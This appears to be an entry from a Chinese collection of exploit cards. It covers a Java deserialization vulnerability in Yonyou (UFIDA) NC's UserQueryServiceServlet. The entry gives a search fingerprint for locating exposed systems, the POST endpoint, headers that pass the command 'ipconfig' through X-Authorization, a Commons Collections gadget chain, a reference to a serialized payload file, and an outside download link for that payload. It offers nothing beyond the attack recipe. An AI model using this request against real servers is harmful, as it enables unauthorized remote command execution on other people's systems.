# 用友NCUserQueryServiceServlet存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /servlet/UserQueryServiceServlet?pageId=login HTTP/1.1`

**请求体 / payload**
```
使用[Commons Collections3中的ChainedTransformer链](http://www.baidu.com/link?url=d27E9ON6cKUeKU6Ttray9CcQu7RlB0ZIswpQ0SnN01yvJwrWyL8eaqzrr44ozvdKiT0MLZ9hn7yTo6GdY-iH8iDGdmC0emLqcren9q_KpPK" \t "https://www.baidu.com/_blank)
Host:
Content-Type: application/x-java-serialized-object
X-Authorization: ipconfig
{{file(C:\path\path\payload.ser)}}
payload.ser文件下载链接：[https://pan.quark.cn/s/e21398dd0b16](https://pan.quark.cn/s/e21398dd0b16)
```
- **预期**：200　|　—